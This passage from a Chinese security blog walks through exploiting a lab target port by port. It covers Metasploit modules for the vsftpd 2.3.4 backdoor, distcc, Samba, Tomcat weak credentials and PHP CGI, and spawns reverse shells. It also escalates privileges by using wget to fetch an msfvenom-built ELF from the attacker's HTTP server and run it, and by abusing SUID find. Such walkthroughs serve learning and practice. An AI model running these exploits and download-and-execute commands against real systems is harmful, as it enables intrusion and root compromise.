+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set rhost 172.20.10.3</span><br><span class="line">set LHOST 172.20.10.4</span><br><span class="line">set LPORT 4444 </span><br></pre></td></tr></table></figure>
+
+<p>RHOST是靶机IP<br>RPORT设置攻击目标主机端口号<br>LHOST是攻击机IP</p>
+<p>这里靶机的6687端口没有开放所以没有成功利用到<br>开放了如下端口，然后上面那个nmap也能看得到开放了哪些端口<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475586-a7064eb4-5734-4dea-8219-43079667143d.png" referrerpolicy="no-referrer" alt="null"><br>如果利用到了是这样的<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475637-6c9eab11-0338-41b2-9fca-27161c41d2ed.png" referrerpolicy="no-referrer" alt="null"></p>
+<h2 id="端口2：6200——-vsftpd-234-backdoor"><a href="#端口2：6200——-vsftpd-234-backdoor" class="headerlink" title="端口2：6200——-vsftpd_234_backdoor"></a>端口2：6200——-vsftpd_234_backdoor</h2><p>6200靶机也没开放，我们这里还是讲一下手法</p>
+<p>利用metasploit<br>找到利用模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search sftpd</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475687-2e70f56f-b1f6-4052-a2f2-4e04bb2ceb3b.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>切换模块 查看配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use exploit/unix/ftp/vsftpd_234_backdoor</span><br><span class="line">show options</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475744-711fb5cf-9b44-4c03-819a-7090d0596f92.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>反弹会话，root权限</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">set RHOSTS 目标IP</span><br><span class="line"></span><br><span class="line">set RPORT 21 #vsftpd 默认端口为 21</span><br><span class="line"></span><br><span class="line">set payload cmd/unix/reverse</span><br><span class="line"></span><br><span class="line">set LHOST 攻击机IP</span><br><span class="line"></span><br><span class="line">set LPORT 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475798-ac9f29c2-46de-4553-813a-6c2af12b2d36.png" referrerpolicy="no-referrer" alt="null"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id # 若显示 uid=0(root)，则已获取 root 权限</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看系统信息，寻找提权漏洞</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/os-release # 查看系统版本 </span><br><span class="line">uname -r # 查看内核版本</span><br></pre></td></tr></table></figure>
+
+
+
+<p>提权<br><strong>利用内核漏洞提权（示例：脏牛漏洞，适用于特定内核版本）</strong><br>在攻击机生成提权脚本（需对应目标架构，如 x86&#x2F;x64）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/exec CMD=&quot;/bin/sh&quot; -f elf &gt; dirtycow.elf</span><br></pre></td></tr></table></figure>
+
+<p>在目标会话中下载并执行（攻击机需开启 HTTP 服务，如 <code>python3 -m http.server 80</code>）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 目标 shell 中操作</span><br><span class="line">wget http://攻击机IP:80/dirtycow.elf   # 下载提权程序</span><br><span class="line">chmod +x dirtycow.elf                 # 赋予执行权限</span><br><span class="line">./dirtycow.elf                        # 执行提权，成功后会获得 root shell</span><br></pre></td></tr></table></figure>
+
+<p><strong>利用 SUID 程序提权</strong><br>查找具有 SUID 权限的危险程序（如 <code>find</code>、<code>bash</code> 等）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null # 列出所有 SUID 程序 # 若存在可利用程序，例如 find： find / -exec /bin/sh \; -quit # 通过 find 执行 shell 获取 root</span><br></pre></td></tr></table></figure>
+
+<p>vsftpd 2.3.4 后门的典型特征是触发后在目标 6200 端口开放 shell，Metasploit 模块会自动连接该端口并反弹会话。</p>
+<h2 id="端口3：1524——-ingrelock-backdoor"><a href="#端口3：1524——-ingrelock-backdoor" class="headerlink" title="端口3：1524——-ingrelock_backdoor"></a>端口3：<strong>1524——-ingrelock_backdoor</strong></h2><p>利用telnet连接1524，直接返回root会话<br>端口3、<strong>1524——-ingrelock_backdoor</strong></p>
+<p>利用telnet连接1524，直接返回root会话</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475880-a2eb5e93-c4ce-4b6a-a304-fdfdd3c8c850.png" referrerpolicy="no-referrer" alt="null"></p>
+<h2 id="端口4：1099——-distcc程序漏洞—-ingrelock"><a href="#端口4：1099——-distcc程序漏洞—-ingrelock" class="headerlink" title="端口4：1099——-distcc程序漏洞—-ingrelock"></a>端口4：1099——-distcc程序漏洞—-ingrelock</h2><p>利用metasploit</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475929-275d20d2-2cff-4a30-8609-485c5cb60d32.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>返回对话</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635475990-5cdd3736-5f32-4dde-b307-eb28786fd63d.png" referrerpolicy="no-referrer" alt="null"></p>
+<h2 id="端口5：139——-samba为3-0漏洞"><a href="#端口5：139——-samba为3-0漏洞" class="headerlink" title="端口5：139——-samba为3.0漏洞"></a>端口5：139——-samba为3.0漏洞</h2><p>先用nmap进行详细扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -A -T4 192.168.195.133</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476051-e803edc1-c7c5-49b2-b871-94ef96447e72.png" referrerpolicy="no-referrer" alt="null"></p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476100-15179c6b-02cf-483e-bf89-ef9eef07f6e8.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>metasploit有众多扫描模块，以适应不同的需要。在metasploit中同样可以使用nmap进行扫描。在命令行中直接键入指令即可。</p>
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476161-24c7b9f7-2b86-42c3-9ce8-fffe7adf6d4a.png" referrerpolicy="no-referrer" alt="null"></p>
+<p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476219-18726041-7bc5-4639-8438-f0e03ea55485.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>Samba</p>
+<p>利用metasploit</p>
+<p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476272-fbd8eee0-6687-4778-a82f-a13267f48b6f.png" referrerpolicy="no-referrer" alt="null"></p>
+<p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476322-76de2766-2390-4210-90b4-62b61b4cb36d.png" referrerpolicy="no-referrer" alt="null"></p>
+<p> <img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476373-843e368f-5f54-4a44-a114-6b4443bcd7af.png" referrerpolicy="no-referrer" alt="null"></p>
+<h2 id="端口6、8180——-Apache-Tomcat弱口令"><a href="#端口6、8180——-Apache-Tomcat弱口令" class="headerlink" title="端口6、8180——-Apache Tomcat弱口令"></a>端口6、8180——-Apache Tomcat弱口令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">在终端中输入命令“nmap 172.20.10.3”，对目标主机进行端口扫描，发现开放8180端口并且运行着ApacheTomcat/CoyoteJSP engine1.1。</span><br><span class="line">在终端中输入命令“msfconsole”，启动MSF终端。</span><br><span class="line">在终端下输入命令“search tomcat”, 搜索tomcat的相关工具和攻击载荷。</span><br><span class="line">在终端输入“use auxiliary/scanner/http/tomcat_mgr_login”， 启用漏洞利用模块, 提示符就会提示进入到该路径下。</span><br><span class="line">在终端下输入“set RHOSTS 172.20.10.3”,设置攻击目标主机IP。</span><br><span class="line">在终端下输入“set RPORT 8180”,设置攻击目标主机端口号.</span><br><span class="line">在终端下输入“exploit”, 实施攻击。获得用户名tomcat,密码tomcat。</span><br><span class="line">在终端下输入“use exploit/multi/http/tomcat_mgr_deploy”, 启用漏洞利用模块, 提示符就会提示进入到该路径下。</span><br><span class="line">在终端下输入“set RHOST 172.20.10.3”,设置攻击的目标主机IP。</span><br><span class="line">在终端下输入“set RPORT 8180”,设置攻击的目标主机端口号。</span><br><span class="line">在终端下输入“set username tomcat”,设置攻击时使用的登录账号tomcat。</span><br><span class="line">在终端下输入“set userpassword tomcat”,设置攻击时使用的密码tomcat。</span><br><span class="line">在终端下输入“exploit”,开始攻击，建立会话。</span><br><span class="line">在终端下输入“getuid”,查看获取的用户权限。</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476422-2b3c6753-c901-41bb-b717-b6b944272aea.png" referrerpolicy="no-referrer" alt="null"></p>
+<p>得到用户名密码分别为tomcat，tomcat</p>
+<p>上面不成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set HttpUsername tomcat</span><br><span class="line">set HttpPassword tomcat</span><br></pre></td></tr></table></figure>
+
+<p>可能版本太老了，tomcat已经做出防护了</p>
+<h2 id="端口7、80——-PHP-CGI参数注入执行漏洞"><a href="#端口7、80——-PHP-CGI参数注入执行漏洞" class="headerlink" title="端口7、80——-PHP CGI参数注入执行漏洞"></a>端口7、80——-PHP CGI参数注入执行漏洞</h2><p><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476483-52503aeb-9bfc-43da-a88f-7d32e920d61f.png" referrerpolicy="no-referrer" alt="null"></p>
+<h1 id="网站渗透"><a href="#网站渗透" class="headerlink" title="网站渗透"></a>网站渗透</h1><p>前面不是dirsearch扫出来，phpinfo和tikiwi吗<br>这里我们就对这两个域名进行操作<br><img src="https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476535-26c0dcb3-d868-4ee5-b351-d01482b9aaa0.png" referrerpolicy="no-referrer" alt="null"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](https://cdn.nlark.com/yuque/0/2025/png/62156892/1765635476602-85919f53-59fc-46d5-a201-15752a43b7e4.png)</span><br></pre></td></tr></table></figure>
+</div></article></div></div><div class="column column-left is-4-tablet is-4-desktop is-3-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="/img/avatar.png" referrerpolicy="no-referrer" alt="Sky"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sky</p><p class="is-size-6 is-block">网络安全技术研究 | CTF竞赛解析 | 漏洞复现分析 | 红队渗透</p><p class="is-size-6 is-flex justify-content-center"><i class="fas fa-map-marker-alt mr-1"></i><span>Hunan</span></p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives/"><p class="title">23</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories/"><p class="title">9</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags/"><p class="title">5</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/flypigc" target="_blank" rel="me noopener">关注我</a></div><div class="level is-mobile is-multiline"><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Github" href="https://github.com/flypigc"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="QQ" href="https://cdn.nlark.com/yuque/0/2025/jpeg/62156892/1766078784961-f9376350-bae6-460e-8b24-81a34063b413.jpeg"><i class="fab fa-qq"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="WeChat" href="https://cdn.nlark.com/yuque/0/2025/jpeg/62156892/1766078785044-f1c1fa04-de3c-42ca-95e2-d48e3410636b.jpeg"><i class="fab fa-weixin"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="me noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://forum.butian.net/people/41325" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">奇安信攻防社区</span></span><span class="level-right"><span class="level-item tag">forum.butian.net</span></span></a></li><li><a class="level is-mobile" href="https://xz.aliyun.com/users/165832/news" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">先知社区</span></span><span class="level-right"><span class="level-item tag">xz.aliyun.com</span></span></a></li></ul></div></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2025/12/"><span class="level-start"><span class="level-item">十二月 2025</span></span><span class="level-end"><span class="level-item tag">22</span></span></a></li><li><a class="level is-mobile" href="/archives/2025/03/"><span class="level-start"><span class="level-item">三月 2025</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget" data-type="adsense"><div class="card-content"><div class="menu"><h3 class="menu-label">广告</h3><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><ins class="adsbygoogle" style="display:block" data-ad-client="test" data-ad-slot="test" data-ad-format="auto" data-full-width-responsive="true"></ins><script>(adsbygoogle = window.adsbygoogle || []).push({});</script></div></div></div><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">follow.it</h3><form action="" method="post" target="_blank"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="column-right-shadow is-hidden-widescreen is-sticky"></div></div><div class="column column-right is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only order-3 is-sticky"><!--!--><div class="card widget" data-type="categories"><div class="card-content"><div class="menu"><h3 class="menu-label">分类</h3><ul class="menu-list"><li><a class="level is-mobile" href="/categories/AI/"><span class="level-start"><span class="level-item">AI</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/CVE/"><span class="level-start"><span class="level-item">CVE</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li><li><a class="level is-mobile" href="/categories/JWT/"><span class="level-start"><span class="level-item">JWT</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/WriteUp/"><span class="level-start"><span class="level-item">WriteUp</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><span class="level-start"><span class="level-item">php反序列化</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/waf%E7%BB%95%E8%BF%87/"><span class="level-start"><span class="level-item">waf绕过</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="level-start"><span class="level-item">代码审计</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/"><span class="level-start"><span class="level-item">内网安全</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/categories/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"><span class="level-start"><span class="level-item">病毒分析</span></span><span class="level-end"><span class="level-item tag">2</span></span></a></li></ul></div></div></div><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-12-18T14:15:40.857Z">2025-12-18</time></p><p class="title"><a href="/2025/12/18/%E6%9C%AA%E6%8E%88%E6%9D%83%E6%9C%8D%E5%8A%A1%E5%88%A9%E7%94%A8/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-12-18T14:13:57.492Z">2025-12-18</time></p><p class="title"><a href="/2025/12/18/%E9%80%9A%E7%94%A8%E7%BB%95waf/">waf绕过手法</a></p><p class="categories"><a href="/categories/waf%E7%BB%95%E8%BF%87/">waf绕过</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-12-13T13:48:36.780Z">2025-12-13</time></p><p class="title"><a href="/2025/12/13/%E9%9D%B6%E5%9C%BA/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-12-13T13:26:31.108Z">2025-12-13</time></p><p class="title"><a href="/2025/12/13/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9CFinance--%E5%A4%96%E7%BD%91%E6%89%93%E9%9D%B6/"> </a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2025-12-13T13:22:53.793Z">2025-12-13</time></p><p class="title"><a href="/2025/12/13/JeecgBoot%20jmreportloadTableDataSSTI%20%E6%BC%8F%E6%B4%9E--CVE-2023-41544/">JeecgBoot jmreport/loadTableData 接口 SSTI 漏洞--CVE-2023-41544</a></p><p class="categories"><a href="/categories/CVE/">CVE</a></p></div></article></div></div><div class="card widget" data-type="tags"><div class="card-content"><div class="menu"><h3 class="menu-label">标签</h3><div class="field is-grouped is-grouped-multiline"><div class="control"><a class="tags has-addons" href="/tags/AI/"><span class="tag">AI</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/java%EF%BC%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"><span class="tag">java，代码审计</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/web%E5%AE%89%E5%85%A8/"><span class="tag">web安全</span><span class="tag">7</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E5%86%85%E7%BD%91%E6%89%93%E9%9D%B6/"><span class="tag">内网打靶</span><span class="tag">1</span></a></div><div class="control"><a class="tags has-addons" href="/tags/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"><span class="tag">病毒分析</span><span class="tag">1</span></a></div></div></div></div></div></div></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" referrerpolicy="no-referrer" alt="Sky&#039;s Blog" height="28"></a><p class="is-size-7"><span>&copy; 2025 Sky</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p><p class="is-size-7">© 2025</p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/moment.js/2.22.2/moment-with-locales.min.js"></script><script src="https://cdnjs.loli.net/ajax/libs/clipboard.js/2.0.4/clipboard.min.js" defer></script><script>moment.locale("zh-cn");</script><script>var IcarusThemeSettings = {
+            article: {
+                highlight: {
+                    clipboard: true,
+                    fold: 'unfolded'
+                }
+            }
+        };</script><script data-pjax src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script data-pjax src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/cookieconsent/3.1.1/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
+      window.cookieconsent.initialise({
+        type: "info",
+        theme: "edgeless",
+        static: false,
+        position: "bottom-left",
+        content: {
+          message: "此网站使用Cookie来改善您的体验。",
+          dismiss: "知道了！",
+          allow: "允许使用Cookie",
+          deny: "拒绝",
+          link: "了解更多",
+          policy: "Cookie政策",
+          href: "https://www.cookiesandyou.com/",
+        },
+        palette: {
+          popup: {
+            background: "#edeff5",
+            text: "#838391"
+          },
+          button: {
+            background: "#4b81e8"
+          },
+        },
+      });
+    });</script><script src="https://cdnjs.loli.net/ajax/libs/lightgallery/1.10.0/js/lightgallery.min.js" defer></script><script src="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
+            if (typeof $.fn.lightGallery === 'function') {
+                $('.article').lightGallery({ selector: '.gallery-item' });
+            }
+            if (typeof $.fn.justifiedGallery === 'function') {
+                if ($('.justified-gallery > p > .gallery-item').length) {
+                    $('.justified-gallery > p > .gallery-item').unwrap();
+                }
+                $('.justified-gallery').justifiedGallery();
+            }
+        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script data-pjax src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script data-pjax src="/js/insight.js" defer></script><script data-pjax>document.addEventListener('DOMContentLoaded', function () {
+            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
+        });</script></body></html>
